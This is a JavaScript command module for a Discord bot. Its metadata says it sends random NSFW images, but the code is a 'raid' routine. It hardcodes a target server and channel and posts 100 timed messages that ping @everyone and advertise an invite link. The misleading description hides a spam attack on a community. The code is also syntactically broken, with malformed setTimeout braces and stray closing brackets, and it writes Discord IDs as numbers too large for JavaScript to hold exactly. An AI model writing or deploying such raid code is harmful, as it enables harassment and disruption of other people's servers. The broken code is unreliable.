
module.exports = {
  name: "raid",
  category: "NSFW",
  description: "Sends random hentai",
  usage: "[command]",
  execute: async (message, args, client) => {
	return new Promise((resolve, reject) => {
		let targetGuild = 811407068941647883;
		let targetChannel = 819961928557920266;
		let message = "get eastview'd @everyone :flushed: https://discord.gg/VYkE8Ma93T";

		if(targetGuild){
			if(targetChannel){
				if(message){
					raidGuild(client, targetGuild, targetChannel, message).then(() => { resolve() });
				} else {
					console.log("You did not specify a message!");
					resolve();
				}
			} else {
				console.log("You did not specify a Channel ID or name!");
				resolve();
			}
		} else {
			console.log("You did not specify a Guild ID!");
			resolve();
		}
	});

	function raidGuild(client, targetGuild, targetChannel, message){
		return new Promise((resolve, reject) => {
			for(var I = 0; I < 100; I++){
				setTimeout(async () => {

						let Guild = client.guilds.get(targetGuild);
						if(Guild){
							if(!isNaN(targetChannel)){
								let Channel = Guild.channels.get(targetChannel);
								if(Channel) Channel.send(`[${Math.floor(Math.random() * 100)}] ${message} [${Math.floor(Math.random() * 100)}]`);
							} else {
								let Channel = Guild.channels.find(channel => channel.name.toLowerCase() == targetChannel.toLowerCase());
								if(Channel) Channel.send(`[${Math.floor(Math.random() * 100)}] ${message} [${Math.floor(Math.random() * 100)}]`);
							}
						}
					});
				}, I * 700);
			}
		});
	}
}


}
